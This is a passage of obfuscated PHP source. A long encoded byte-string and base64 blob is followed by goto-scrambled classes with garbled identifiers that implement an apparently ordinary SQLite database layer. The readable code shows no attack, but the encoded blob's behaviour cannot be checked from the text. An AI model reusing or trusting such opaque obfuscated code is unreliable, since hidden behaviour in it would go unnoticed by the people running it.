\156\267\305\254\370\333\225\311\210\101\352\175\36\251"."\304\223\152\304\311\310\0\126\223\73\242\334\14\236\46\101\104\310\2\207\47\315\226\10\150\2\215\300\335\200\112\2\166\254\303\12\7\145\61\40\373\230\245\107\263\152"."\306\60\21\60\374\314\116\21\162\224\336\41\167\313\70\111\221\104\237\355\50\102\156\141\213\0\301\302\61\204\122\360\246\314\202\224\111\312\52\311\252\42\324\134\75\241"."\50\40\77\242\75\205\52\1\31\213\44\112\66\123\62\303\130\326\320\300\216\310\154\253\311\23\5\315\1\142\250\352\152\44\307\20\204\327\72\143\61\376\35\173\6\235"."\x44\xe8\x4d\x8c\xa4\x92\xc5\xd6\x78\x88\x1c\xa1\x83\xa9\x38\xd7\x66\x91\x17\x13\x9a\x2\xfe\x90\xbf\x86\x3a\x9d\x2f\xa4\xf6\x9a\x4c\x19\x5b\x1d\xdf\x20\xe0\x2\x10\xb5\x94\x9e\xeb\x69"."\x35\xa7\x60\xac\x82\x93\x40\xc8\xf0\x67\x73\xe9\x34\xb3\x7\x80\xbc\x23\xdb\xcf\xf0\xb1\x4e\x30\x91\x33\xf8\x4e\x8\xbd\xc6\x86\xe0\x85\x23\x9d\x80\x5\x37\x4f\xd0\xc9\x94\x12\x73\x98"."\x2\x5\x92\xe1\xf3\x78\x58\x8\x5d\x1f\x26\xd5\x5\x2e\x3e\xa9\x51\xe7\x56\x15\x65\x65\x65\xf6\xb2\x72\xf0\x87\x9d\x38\x12\xe6\xab\xb2\xac\x2c\x2f\x49\x59\x59\x25\xfa\x83\x23\x90\xc2"."\x95\x60\xd1\x1c\x3\x16\x34\xa5\x3c\x24\x41\x8f\xa2\x90\x6\x11\x1a\x9f\x52\xd3\x39\xca\x1f\xd5\x40\x3b\x76\x9\xb6\xac\xaa\x8a\x2c\x2f\x83\x75\x0\x60\x10\x5d\x92\xaa\xa4\x64\x61\xa6"."\40\327\315\224\320\231\26\11\51\126\64\260\303\102\62\50\164\353\200\153\235\176\3\106\5\14\20\102\13\151\61\273\117\1\222\361\241\7\355\360\244\143\104\2\231\211"."\xaf\xab\x54\x89\x95\x39\x28\x7a\x45\xa0\x78\xcc\x64\xaa\x15\xa4\x3\xdb\x67\x94\x35\x18\x2\x4\x5d\x5\xba\x1b\xc6\xae\x5\xa0\x50\x92\xdd\x18\x84\xc1\x46\x96\x14\x3b\x9a\xc6\x77\x1d"."\110\157\13\314\236\204\326\23\346\273\36\14\236\305\102\250\363\120\122\241\123\206\165\223\140\200\322\74\72\105\350\241\64\71\343\106\167\344\72\325\244\351\326\122\130\50".strrev('hÆwº¢≠¯’ô0éT∆[∫z#Ω»ü"˘‘ù>±0t∑2tm§&<íÙ[').base64_decode('SLhrR3XLwf9iZEEhHgrAZgk1zL2VUIA1ypLHFROeYNK5X6sa5sJOdHaFj3GFww==')."\176\235\70\127\345\347\266\264\214\156\101\200\160\144\262\132\73\300\277\56\366\25\300\233\12\203\131\362\374\224\5\22\261\16\211\351\104\40\264\57\242\257\1\221\251\304"."\x6f\x2b\xc9\xfc\x9d\x32\x21\x29\xdf\x8b\x5\xa0\xd9\xd6\x47\x88\xa8\x61\x1e\xe9\x45\x20\x14\x48\xc4\x93\x7a\x64\x42\x64\x2e\x3\x4a\x3a\x66\x8\x6b\xd9\xaf\xcc\x15\x2a\xa1\x1a\xe4\xe5"."\50\341\246\31\111\306\15\236\240\366\100\324\150\252\32\65\2\200\330\340\7\162\146\170\336\54\43\113\201\222\101\274\160\314\161\357\135\270\232\176\254\241\251\140\347\231"."\xa2\x4a\xd4\xd7\xc2\x8e\x87\x45\x21\x1c\x2e\x97\x7a\xf6\xca\x51\x81\xe9\x62\x9e\x12\x79\x63\x8f\xb4\xb9\xb0\x80\x4a\x46\x2c\x84\x10\x90\x40\x28\x2f\x12\xa3\xed\xed\xca\x29\x94\x7f\x12"."\x28\x8b\x64\x70\xba\x2\xdb\x4\xcd\x69\x13\x59\xcd\x30\xc4\xdb\xb2\x2e\x6a\xb4\x4\x3\x3e\x71\xf7\xc\xe1\x2c\xf6\xd9\xbc\x1e\xd3\xf1\x8e\xe0\x3b\x92\x25\x5\x14\x9c\xd6\x2e\x53\xd2"."\x8d\x6c\x6a\x1c\xc8\xa7\x2d\x67\xfd\x2d\x41\xab\xdd\xd\x22\xd5\x6\x25\xc6\xd4\xe9\x66\x9a\xbd\x44\x0\x87\x33\x28\x98\x3d\x14\xa8\x81\x64\x62\x59\xc8\xe\x92\x55\xa2\x5a\x16\x9\x84"."\302\35\307\264\21\120\332\305\240\117\143\202\60\74\116\120\12\24\1\357\166\13\223\23\316\2\40\242\345\304\233\342\202\317\116\20\22\74\254\12\333\272\275\134\142\374".base64_decode('QBiXjAMThQiUvhBrYFHHCPaPSAIN5iJM823Zrql1pSRumdRGEhaAbhfDHuhiHA==')."\x28\x16\x7a\x9\xe4\x3d\x13\xb3\xa0\x3a\xf3\xb2\xe0\x38\xb8\xcd\x71\x63\x4a\x31\x46\x7\x52\xb\x44\xd5\xd0\x31\x5\xaa\x42\x51\x2\x46\xa3\xcc\x1\x0\xc1\xe\x47\x12\x89\xe8\x53\xa8".base64_decode('aZW9vMI+iShdRTtLsjUS/EJOUpgGkN+lFIzYSZF0PI0mvHaEbuLyS4fo0jEbTw==').base64_decode('dDuZhbLCjqMwGyp0TVckK/yMF5tWwQTNheIxhmC022R5ZkkAVoY5njhfTZlerw==').base64_decode('BPPAZL5gKYS43RUdzKJcvB/ciA+ANOziVUAMP6vGF5ip9SGjSxwc0hgw/7zbwQ==')."\xac\x2f\xc9\xcd\x13\xf2\xac\x50\x49\x29\xbc\x79\x62\xd2\x34\x34\xf4\xb1\x1b\x4\x60\x24\x3b\xe1\xfe\xc8\x4c\xe0\x74\x31\x40\x63\xd9\xe4\xd4\x4d\x1\x6c\x32\x62\xca\xcd\x40\x2c\x55\x8f"."\x42\x2e\x91\x30\x9\xb9\xa9\xbe\xc9\xc9\x40\xd5\x14\x4d\xec\x2e\x28\x11\xa1\xf8\x43\x35\xc4\x98\x8a\xdc\xe2\xe8\x1\x78\xd7\x7a\xc8\x2\xab\xa9\x64\x56\x34\xf4\x35\xcc\x9e\x94\x1a\x95".base64_decode('fP46b43L5/YG50rQYwE/yUdm1ObljjRGeHDozI8wn8Lw0x4BbKE9xnhjnXPBgg==')."\161\215\340\131\337\134\54\236\243\112\66\257\104\300\123\247\314\4\1\345\201\172\260\2\251\223\134\23\44\44\316\144\225\374\364\175\12\172\322\222\267\130\310\220\53\320"."\32\222\276\160\15\140\211\230\123\203\315\132\111\17\325\170\65\335\255\352\52\47\16\64\107\237\130\72\327\364\145\231\13\154\1\351\61\321\313\65\107\66\256\45\337\175".strrev('w$+ÁÜî°>Qv'."\0".'WUedœÜx((„ˇp≥Ô&∑™+?Dòx®µt∫ åq')."\347\301\260\0\174\342\361\177\135\270\32\343\376\27\54\115\123\143\364\264\233\331\312\143\167\300\65\342\23\63\264\11\171\356\353\377\253\43\174\33\127\325\207\321\55\165"."\372\272\4\172\347\226\234\103\260\63\336\60\276\375\316\253\0\142\123\266\57\43\236\225\70\143\324\101\71\225\332\240\353\27\17\325\223\302\0\347\117\141\162\122\32\254"."\16\113\50\100\136\202\207\6\224\223\245\212\11\260\240\11\332\115\147\205\26\227\376\126\343\70\323\273\216\171\165\100\163\245\241\313\1\371\44\56\263\263\4\122\225\124"."\206\224\101\374\225\7\151\26\275\266\303\253\100\356\36\74\251\214\141\22\302\352\105\343\126\1\305\30\200\270\17\56\271\100\323\13\55\325\227\7\60\311\367\76\332\56"."\x66\x9e\x5\x5d\x4b\xa7\xe3\x9a\x88\x6\x44\x0\xc1\x3e\x82\x9f\x2b\x81\x26\xcb\xf8\xb\x8b\x7d\x36\xc0\x88\x2b\x46\xbe\x5f\x7b\x5c\xce\x90\x85\xea\xd6\x2d\x84\xb3\x33\x80\x28\x4\x13".base64_decode('Wo/5BRIIEZgXE1E21wVjhMmMLm8KV2HoL3QJYHpQQCh9HP5pI7+UyluLxuuaNA==')."\245\224\215\175\215\351\235\151\1\320\240\160\111\14\345\202\347\340\162\232\221\55\342\321\237\275\64\302\227\27\215\23\246\24\172\323\302\75\104\126\13\130\62\173\32\347"."\16\334\371\16\144\166\272\315\116\276\230\125\24\262\116\23\135\250\207\264\220\334\156\303\274\17\244\100\74\124\335\47\176\213\206\200\250\323\40\222\352\104\142\154\6\314"."\x16\x12\xd0\x47\x41\x62\x36\xf4\x62\x5\xa6\x43\xd6\x57\x51\x84\xf5\xc3\x88\x9b\x98\xbb\x3d\xa9\x45\xe4\x64\x0\x9b\xd3\x98\xac\xd5\xb3\x40\x6e\x61\xc6\x72\xa6\x64\x18\xe4\x94\x33\x19".base64_decode('rpy3KOAxkCjjc2kvvhtlgmYFuUg0xcRHEvwCCEkOamvCZxCk22KR9BwI/UDJqQ==')."\126\170\326\320\231\177\156\4\315\175\310\152\27\355\342\310\171\236\103\24\134\110\2\151\226\304\7\330\264\100\341\204\200\253\36\175\240\125\57\62\272\277\2\145\363\320".strrev('çè{ÿlE\'±±üÑöøå˜'."\r".'àˆ¥[Îc√Úá/&\\√◊ƒ≠«Ë∞ûn¸').strrev('å?π“ÀO∆ì_-!qÄÜK*Üo9[~«ñHffÿ3â˘ôZ˛ÈÌ~y„b$<')."\x1\xb3\x24\x92\xd7\x61\xa1\x87\xb9\x6c\xd2\x86\xce\xa\x6d\xd4\x17\x8a\x5\x1d\xbc\x57\xe2\xc8\x14\xc0\xe1\x7f\x2f\x3\xdb\x13\x22\xf1\x22\x66\xa6\x3a\x95\xb3\x22\x59\x7a\xc6\x62\x4d"."\xa6\x9a\x66\x1d\x10\xea\xb9\x41\x3b\xf6\x25\x95\xf7\x8c\x41\x6b\x2a\x56\x31\x69\xca\xc\x51\x8c\xe7\xe3\xc3\xcf\x2e\x88\x37\x42\xea\xaa\x12\xff\x90\x1d\x9d\xf\xbc\x24\x54\xe\xc9\x25"."\xf5\x63\x25\x2e\x5f\x14\x69\xb6\xf8\xcc\x7f\xf8\x47\x98\xa2\x66\x92\xfc\xbf\x5b\xa\x9c\x29\xc6\x49\x5\x4b\xcc\xfc\xf7\xc0\xf2\x50\x82\x66\xa5\x60\xb5\x20\x6c\x68\x96\x53\x69\xd\x1e".strrev('∑¢°Ï®&\',ŸYnTÀ≈	-i¯XVØËTœ¬Îòˇ„x±ºÎ')."\370\24\153\333\21\142\210\42\201\107\13\362\202\130\242\241\131\265\40\60\73\334\250\220\22\316\237\116\222\155\27\336\130\344\213\354\377\156\0\251\110\200\245\7\156\240"."\x50\xa0\xe7\xce\x33\x29\x21\xb1\xbc\xc9\x63\x79\x54\xed\x57\xda\x8d\x99\x2e\x26\xfe\xd8\x65\xfa\xce\xf\x1a\x54\x41\x73\xa6\x18\x7e\x34\xc0\x38\x28\x48\x63\xe6\xbe\x5a\x8a\x7\xd9\x78".base64_decode('GYts0lCJ8rkw4Q0i7thBYLlgbno1aghhllIr/rwKutzCldForZrWreAnTrwrgg==').base64_decode('ChKXQX7RSD9C2ksWLnzMHl8HctWxK0KyYD8CUSe8q6WJ3+b7t37qTwswSSZBCw==').base64_decode('hN2Wp9cQ8bG+x0b7j9Y5p2nCXTOTOMDeITGJB7r1QR7ATonu8UCQzXCyeRKqhw==').base64_decode('THNxbTbra3wZ4aqt5Z1QQVVpfgHUdCUPuiCwLGt60Q/em8TnJzgB9laGvykn/g==')."\xff\xfc\x3a\xdf\xff\xaf\x47\xf9\xa6\x94\x51\xa5\xb2\xe9\xe5\xb6\x3a\xc2\xe0\x92\xd6\xc2\xf3\x1d\x26\x9c\x63\x85\xa6\xa5\x1f\xe6\x2d\x72\x84\x18\x4b\x66\xa8\xcd\x14\x22\x1\xbe\xe0\xe0"."\xde\xe3\xb0\x3c\x86\xea\x60\xb6\x8a\xd4\x65\x5\xf5\x64\x21\xd3\x3\x13\x19\x3e\x49\x94\xa7\xa0\xa4\x4f\x79\x81\x19\xd9\xc9\x5e\x9a\x2a\x14\xc8\x7f\x60\xd1\x34\xf9\x28\xbf\xc9\x9b\x99"."\126\243\235\5\16\340\340\20\370\314\256\4\5\56\41\57\31\247\117\200\231\240\116\72\234\364\53\12\305\54\310\112\122\262\50\336\44\363\147\250\100\126\112\50\361\242"."\63\51\371\100\167\123\11\25\21\51\207\11\224\107\157\102\246\135\320\4\24\321\303\137\45\165\230\337\305\44\71\32\54\17\51\341\104\324\321\120\376\343\225\371\347\261".base64_decode('+bnZYhazQNtNs06GPcZYZn2dsdyeXxk2nYb6hACU+OmERAcO6ECwQB68LIM8zQ==').base64_decode('ENO/8CJkT2kKgjD4EvtLF3NTVkOsmBnKtBqCpZzwMmDeo2UWxT0Qj/hJlqohVw==').base64_decode('oaTbweaGEmT9T2Yq4O6FZ3+NVAZruwaEPZReshGsVgnIpJPSRQfI5pzQDtm8Ug==')."\146\27\112\26\325\262\272\220\214\301\13\245\205\357\302\31\46\154\162\377\255\126\277\255\110\24\306\322\255\111\310\45\307\206\42\110\70\125\3\354\155\314\354\215\31\105"."\42\60\165\374\104\337\202\346\347\102\346\143\71\346\242\62\217\122\345\124\237\20\215\162\121\327\41\340\27\136\66\362\362\333\327\50\32\153\263\135\335\262\101\17\267\254"."\271\232\115\262\204\160\210\27\105\163\307\223\177\116\303\217\217\204\315\237\146\203\302\10\247\265\26\270\100\374\71\265\223\273\371\321\14\347\176\143\61\366\306\247\51\151"."\x8c\xf2\xff\xc\xa\x20\xfc\x39\x50\xc8\xeb\x8\xf7\x17\xb9\xa1\xac\xd2\x63\x7d\x7d\xce\x21\xde\x79\x34\x25\xcc\x87\xf2\xfb\x8d\x42\x7e\xae\xa5\xe7\xdd\x84\xb0\x42\xdd\x47\x4b\xc6\x9c"."\x5d\xbc\x3f\xc9\x26\x15\x7\x61\x57\xbe\xcc\x30\x45\x90\x34\xa0\xc1\x37\xb7\x58\xc1\x5d\x61\x72\x34\xaf\xd2\x7c\x5b\x93\x25\x63\x63\x6\xd2\x20\xf3\x7a\xbb\x9\x6a\x91\x9d\xa0\x56\x82"."\x6e\xe3\x96\x28\x5d\x7c\xbe\xd4\x7c\x36\x27\xa\xf6\xc2\x14\x50\x92\x3e\xa1\x38\xf1\xdc\x6e\xc8\xc\xc1\xc2\x95\xf0\x59\x69\x46\xb1\x70\xb3\x95\x47\xd0\xcd\x4a\x2c\xc5\x44\xec\x58\xc7".strrev('Êœôí,ÇDjèz·û÷≈ÎKÈ˘…A”‚ê¶/ßœ€huéjiÄ H').base64_decode('IZVUVLi91lZRnFolNF5IXnuEw/+QViAPblHBbDgKPbLNeEhT3iFQAPPiKJg3Lw==').base64_decode('mmYWVBtCPkPO6UN0Lx95RMqPFeiwRRbGSYfCZ8HE+dWRGWdNjdQChVvBpXnLAQ==').base64_decode('a6FWFEw8ZCsKPBxMvGgVoLU0pgB15afx+XScxxWwDcBlwj1adM9SIFo0NChsig==').base64_decode('ECi49HWzjYAFLiKG2gsBiY2/qCtYsI4zkfRcujOtsW0ixq26oAUne3eWVZdXmg==')."\171\152\246\163\202\65\146\101\203\132\33\172\216\74\117\222\115\312\124\123\56\330\42\143\251\105\63\324\250\140\247\144\175\200\35\307\323\112\222\202\2\316\242\373\342\322"."\xbe\xe9\x7c\xba\x80\x76\x8\x81\xf0\xa7\x83\x2b\x9d\x4d\x96\xd9\x78\xff\x27\xda\x76\x7c\xe8\x56\x3\xcf\x5c\xd9\x41\xb\x14\xaf\x6c\x78\xbf\xc4\xd1\xf0\x45\x78\x1b\x8c\xb\x69\x19\xf4".base64_decode('W60ZBqUkQP5HKRGTBzc9m2CjAL74qQrEIlL0o+mIyAb6JMd/UOAMKjgWERtTAA==')."\36\40\260\200\270\247\221\63\273\332\234\345\340\221\3\200\20\31\321\172\251\57\64\170\25\224\267\207\77\127\53\133\31\71\316\203\220\371\46\132\134\240\13\267\272\23".strrev('\\ö¢Û¿≥’àË%jDüª/$›%k¯if~#±ŸM⁄dtåºN√*;Yõâ8«')."\301\140\213\77\340\306\336\52\363\242\121\56\301\270\45\57\252\251\336\337\70\124\234\247\301\345\365\345\305\101\143\227\306\60\167\226\203\243\274\115\250\225\56\237\317\337"."\62\124\53\274\65\163\171\113\320\321\52\127\176\147\22\32\325\144\323\63\202\240\234\44\163\112\274\105\246\244\270\327\44\236\307\254\42\20\307\125\247\16\305\330\207\331"."\247\273\305\356\214\116\130\122\20\64\124\151\44\145\7\62\4\12\275\167\262\305\315\230\145\324\41\315\142\34\217\17\217\35\246\23\147\1\216\26\13\42\61\302\44\24"."\x77\x57\x4\x98\x50\x10\x63\xa2\xfe\x34\x5f\x9f\x8f\x62\x39\x46\x60\x4b\xcf\xd2\x88\x69\x54\x87\x16\x11\xf4\xf5\x58\x76\x21\xb7\xb9\x8\x8e\x5\xeb\x24\xfc\x4d\xa2\xff\xf\xbd\xdf\x23"."\125\242\235\0\0"."".""."".base64_decode(''), 10, -8))); goto F¡ûÉ¬÷çå; a÷ø◊àˆ«•: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto BÕöÈ–ó€Ñ; BÕöÈ–ó€Ñ: $DòíúﬂÃπŒ =& $_SERVER[ú∫]; global $in, $config; $this->config =& $config; goto Båƒ›Öçªœ; Båƒ›Öçªœ: $this->in =& $in; $this->values[$DòíúﬂÃπŒ[6]] =& $config; $this->values[$DòíúﬂÃπŒ[7]] =& $in; goto D“òƒ‚¢ªò; D“òƒ‚¢ªò: $this->tpl = TEMPLATE . MOD . $DòíúﬂÃπŒ[8]; $this->_classObjectID = mt_rand(0, 10000); goto DèÖÁÙâ ô; DèÖÁÙâ ô: } public function loadClass($Bä†≥¿æ°œ) { if (1 === func_num_args()) { $this->{$Bä†≥¿æ°œ} = new $Bä†≥¿æ°œ(); } else { $bØÊΩÜÑ√â = new ReflectionClass($Bä†≥¿æ°œ); $EäıúÛ§√á = func_get_args(); array_shift($EäıúÛ§√á); $this->{$Bä†≥¿æ°œ} = $bØÊΩÜÑ√â->newInstanceArgs($EäıúÛ§√á); } return $this->{$Bä†≥¿æ°œ}; } protected function assign($e‹¯’Ñº™∫, $E÷à‘é”∫Ù) { $this->values[$e‹¯’Ñº™∫] = $E÷à‘é”∫Ù; } protected function display($bû‰Ôò«ÕÁ) { ob_end_clean(); extract($this->values); require $this->tpl . $bû‰Ôò«ÕÁ; } } class DbSqliteBase extends Db { public function __construct($eÏ„∞êâ∏∑ = '') { $e·à«ÔÍ¯’ =& $_SERVER[ú∫]; if (!extension_loaded($e·à«ÔÍ¯’[9])) { think_exception(think_lang($e·à«ÔÍ¯’[10]) . $e·à«ÔÍ¯’[11]); } if (!empty($eÏ„∞êâ∏∑)) { if (!isset($eÏ„∞êâ∏∑[$e·à«ÔÍ¯’[12]])) { $eÏ„∞êâ∏∑[$e·à«ÔÍ¯’[12]] = 438; } $this->config = $eÏ„∞êâ∏∑; if (empty($this->config[$e·à«ÔÍ¯’[13]])) { $this->config[$e·à«ÔÍ¯’[13]] = array(); } } } public function connect($eÊ¶¢ûçÌ = '', $Dµ ‘´∞üë = 0) { $Bêˆñ◊’üñ =& $_SERVER[ú∫]; if (!isset($this->linkID[$Dµ ‘´∞üë])) { goto f’à‚éàí°; b”çåÍàÌü: $this->linkID[$Dµ ‘´∞üë] = $c§»çîö◊Ú($eÊ¶¢ûçÌ[$Bêˆñ◊’üñ[17]], $eÊ¶¢ûçÌ[$Bêˆñ◊’üñ[12]]); if (!$this->linkID[$Dµ ‘´∞üë]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto fÜ¿Úå Ñ ; fÜ¿Úå Ñ : @sqlite_busy_timeout($this->linkID[$Dµ ‘´∞üë], 30000); if (1 != think_config($Bêˆñ◊’üñ[18])) { unset($this->config); } goto dÜÜå¬—€⁄; f’à‚éàí°: if (empty($eÊ¶¢ûçÌ)) { $eÊ¶¢ûçÌ = $this->config; } $aˆ¯ûÓñΩù = !empty($eÊ¶¢ûçÌ[$Bêˆñ◊’üñ[13]][$Bêˆñ◊’üñ[14]]) ? $eÊ¶¢ûçÌ[$Bêˆñ◊’üñ[13]][$Bêˆñ◊’üñ[14]] : $this->pconnect; $c§»çîö◊Ú = $aˆ¯ûÓñΩù ? $Bêˆñ◊’üñ[15] : $Bêˆñ◊’üñ[16]; goto b”çåÍàÌü; dÜÜå¬—€⁄: } return $this->linkID[$Dµ ‘´∞üë]; } public function free() { $this->queryID = null; } public function query($aÚ°»ñîÚŸ) { goto d«Ó¢Ì˘ìœ; bÏòﬁÉØ∑Ã: $this->queryStr = $aÚ°»ñîÚŸ; if ($this->queryID) { $this->free(); } think_action_status($eåèçá≠Ñ[19], 1); goto c≠ƒ»∂ùçÍ; d«Ó¢Ì˘ìœ: $eåèçá≠Ñ =& $_SERVER[ú∫]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto bÏòﬁÉØ∑Ã; c≠ƒ»∂ùçÍ: think_status($eåèçá≠Ñ[20]); $this->queryID = sqlite_query($this->_linkID, $aÚ°»ñîÚŸ); $this->debug(); goto EÃù£Ω∫‡â; EÃù£Ω∫‡â: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Bõõ≥Øå”∂ = $this->getAll(); return $Bõõ≥Øå”∂; } goto C±Úˆ„‰°“; C±Úˆ„‰°“: } public function execute($bÜùé÷»êâ) { goto AúÙßã‰ΩÌ; F≈éπà∂‰ÿ: $this->queryStr = $bÜùé÷»êâ; if ($this->queryID) { $this->free(); } think_action_status($d‰øŒ∑©≠æ[21], 1); goto FÖ»ëÿÛ£´; FÖ»ëÿÛ£´: think_status($d‰øŒ∑©≠æ[20]); $E”Ø∫ÆëÀ÷ = sqlite_exec($this->_linkID, $bÜùé÷»êâ); $this->debug(); goto FãîêäÉ·¡; AúÙßã‰ΩÌ: $d‰øŒ∑©≠æ =& $_SERVER[ú∫]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F≈éπà∂‰ÿ; FãîêäÉ·¡: if (!1 === $E”Ø∫ÆëÀ÷) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Aåèò¿§æ; Aåèò¿§æ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ú∫][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D„•úÔ∏Ö† = sqlite_query($this->_linkID, $_SERVER[ú∫][23]); if (!$D„•úÔ∏Ö†) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $DèåüÑ‘òØ = sqlite_query($this->_linkID, $_SERVER[ú∫][24]); if (!$DèåüÑ‘òØ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $a¯Óô¢◊¶” = array(); if ($this->numRows > 0) { for ($B”–Ó∫êâà = 0; $B”–Ó∫êâà < $this->numRows; $B”–Ó∫êâà++) { $a¯Óô¢◊¶”[$B”–Ó∫êâà] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $a¯Óô¢◊¶”; } public function getFields($cÛÿê‹ãıÖ) { $fÜ‚á⁄ªêî =& $_SERVER[ú∫]; $d€ÿ≈æØ‘æ = $this->query($fÜ‚á⁄ªêî[25] . $cÛÿê‹ãıÖ . $fÜ‚á⁄ªêî[26]); $B¬é‚ã”∆∏ = array(); if ($d€ÿ≈æØ‘æ) { foreach ($d€ÿ≈æØ‘æ as $dŸÎäùíŸ≈ => $DçÉ¡ºôä) { $B¬é‚ã”∆∏[$DçÉ¡ºôä[$fÜ‚á⁄ªêî[27]]] = array($fÜ‚á⁄ªêî[28] => $DçÉ¡ºôä[$fÜ‚á⁄ªêî[27]], $fÜ‚á⁄ªêî[29] => $DçÉ¡ºôä[$fÜ‚á⁄ªêî[30]], $fÜ‚á⁄ªêî[31] => (bool) ($DçÉ¡ºôä[$fÜ‚á⁄ªêî[32]] === $fÜ‚á⁄ªêî[33]), $fÜ‚á⁄ªêî[34] => $DçÉ¡ºôä[$fÜ‚á⁄ªêî[35]], $fÜ‚á⁄ªêî[36] => strtolower($DçÉ¡ºôä[$fÜ‚á⁄ªêî[37]]) == $fÜ‚á⁄ªêî[38], $fÜ‚á⁄ªêî[39] => strtolower($DçÉ¡ºôä[$fÜ‚á⁄ªêî[40]]) == $fÜ‚á⁄ªêî[41]); } } return $B¬é‚ã”∆∏; } public function getTables($B±¶û¯¨µ÷ = '') { $EÕ◊¨ÙÖÔÊ =& $_SERVER[ú∫]; $a∏âàƒÿ≈≤ = $this->query($EÕ◊¨ÙÖÔÊ[42] . $EÕ◊¨ÙÖÔÊ[43] . $EÕ◊¨ÙÖÔÊ[44]); $Fèñôó≤¯ı = array(); foreach ($a∏âàƒÿ≈≤ as $d–Ìó˜Ìí© => $F≠Ÿä»éÓ’) { $Fèñôó≤¯ı[$d–Ìó˜Ìí©] = current($F≠Ÿä»éÓ’); } return $Fèñôó≤¯ı; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $aÚåôŒ“Ø =& $_SERVER[ú∫]; $fî•≠äô¬¢ = sqlite_last_error($this->_linkID); $this->error = $fî•≠äô¬¢ . $aÚåôŒ“Ø[4] . sqlite_error_string($fî•≠äô¬¢); if ($aÚåôŒ“Ø[33] != $this->queryStr) { $this->error .= LNG($aÚåôŒ“Ø[45]) . $this->queryStr; } think_trace($this->error, $aÚåôŒ“Ø[33], $aÚåôŒ“Ø[46]); return $this->error; } public function escapeString($cªêÙÆ´«ß) { return sqlite_escape_string($cªêÙÆ´«ß); } public function parseLimit($CíﬂçıÖçã) { $e‰∏Ïü√…ê =& $_SERVER[ú∫]; $FÉ÷Ìéî™Ö = $e‰∏Ïü√…ê[33]; if (!empty($CíﬂçıÖçã)) { $CíﬂçıÖçã = explode($e‰∏Ïü√…ê[47], $CíﬂçıÖçã); if (count($CíﬂçıÖçã) > 1) { $FÉ÷Ìéî™Ö .= $e‰∏Ïü√…ê[48] . $CíﬂçıÖçã[1] . $e‰∏Ïü√…ê[49] . $CíﬂçıÖçã[0] . $e‰∏Ïü√…ê[50]; } else { $FÉ÷Ìéî™Ö .= $e‰∏Ïü√…ê[48] . $CíﬂçıÖçã[0] . $e‰∏Ïü√…ê[50]; } } return $FÉ÷Ìéî™Ö; } } class DbSqlite3Base extends Db { public function __construct($dâ—¨Æ»ç© = '') { $d≤êÊπôÿ† =& $_SERVER[ú∫]; if (!class_exists($d≤êÊπôÿ†[51])) { think_exception(think_lang($d≤êÊπôÿ†[10]) . $d≤êÊπôÿ†[52]); } if (!empty($dâ—¨Æ»ç©)) { if (!isset($dâ—¨Æ»ç©[$d≤êÊπôÿ†[12]])) { $dâ—¨Æ»ç©[$d≤êÊπôÿ†[12]] = 438; } $this->config = $dâ—¨Æ»ç©; if (empty($this->config[$d≤êÊπôÿ†[13]])) { $this->config[$d≤êÊπôÿ†[13]] = array(); } } } public function connect($EêÿñØÖƒö = '', $eûØæ≥ö⁄Ö = 0) { $D∆∂¿ä ï® =& $_SERVER[ú∫]; if (!isset($this->linkID[$eûØæ≥ö⁄Ö])) { if (empty($EêÿñØÖƒö)) { $EêÿñØÖƒö = $this->config; } $this->linkID[$eûØæ≥ö⁄Ö] = new SQLite3($EêÿñØÖƒö[$D∆∂¿ä ï®[17]]); if (!$this->linkID[$eûØæ≥ö⁄Ö]) { think_exception($this->linkID[$eûØæ≥ö⁄Ö]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$eûØæ≥ö⁄Ö]->busyTimeout(30000); if (1 != think_config($D∆∂¿ä ï®[18])) { unset($this->config); } } return $this->linkID[$eûØæ≥ö⁄Ö]; } public function free() { $this->queryID = null; } public function query($fÖ⁄Ï‡°ã©) { goto aËËﬂã™∫ù; aËËﬂã™∫ù: $F¬Ã±Ÿ∫”ã =& $_SERVER[ú∫]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÃ⁄‚Îß√Û; D¿Ü÷ò´¿â: if (!1 === $this->queryID) { $this->error(); return !1; } else { $dãËãÏ—»É = $this->getAll(); $this->numRows = count($dãËãÏ—»É); return $dãËãÏ—»É; } goto FÜºøÌÔö¥; EÃ⁄‚Îß√Û: $this->queryStr = $fÖ⁄Ï‡°ã©; if ($this->queryID) { $this->free(); } think_action_status($F¬Ã±Ÿ∫”ã[19], 1); goto d‰£Ó◊›…—; d‰£Ó◊›…—: think_status($F¬Ã±Ÿ∫”ã[20]); $this->queryID = $this->_linkID->query($fÖ⁄Ï‡°ã©); $this->debug(); goto D¿Ü÷ò´¿â; FÜºøÌÔö¥: } public function execute($D°∞∑ê≈‡π) { goto FÛ∏÷ãê∏è; C€ÔÌÔÇøæ: if (!1 === $Aﬂ¶ –ò≤œ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto cø”Çé–Ìª; fò ıæ⁄• : think_status($dŒ“òﬂ≈∏Ô[20]); $Aﬂ¶ –ò≤œ = $this->_linkID->exec($D°∞∑ê≈‡π); $this->debug(); goto C€ÔÌÔÇøæ; FÛ∏÷ãê∏è: $dŒ“òﬂ≈∏Ô =& $_SERVER[ú∫]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aˆ‚ß≤∞Ù“; aˆ‚ß≤∞Ù“: $this->queryStr = $D°∞∑ê≈‡π; if ($this->queryID) { $this->free(); } think_action_status($dŒ“òﬂ≈∏Ô[21], 1); goto fò ıæ⁄• ; cø”Çé–Ìª: } public function startTrans() { 